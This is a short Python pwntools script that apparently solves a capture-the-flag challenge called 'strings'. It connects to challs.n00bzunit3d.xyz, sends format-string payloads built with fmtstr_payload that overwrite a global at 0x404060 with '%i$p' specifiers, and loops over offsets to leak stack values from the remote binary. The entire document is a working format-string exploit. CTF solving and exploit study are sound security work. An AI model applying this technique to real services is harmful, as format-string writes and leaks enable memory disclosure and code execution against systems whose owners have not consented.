from pwn import *

elf = context.binary = ELF("strings")
context.log_level = 'warning'

offset = 6

printout = False
for i in range(1,100):
    p = remote("challs.n00bzunit3d.xyz", 7150)

    writes = {0x00404060: f"%{i}$p".encode()}
    payload = fmtstr_payload(6, writes)

    p.sendline(payload)
    leak = p.recvall().split(b'0x')
    if(len(leak) == 1):
        continue

    leak = leak[1]
    if(b'30' in leak):
        printout = True
    
    if(printout):
        print(leak)
    p.close()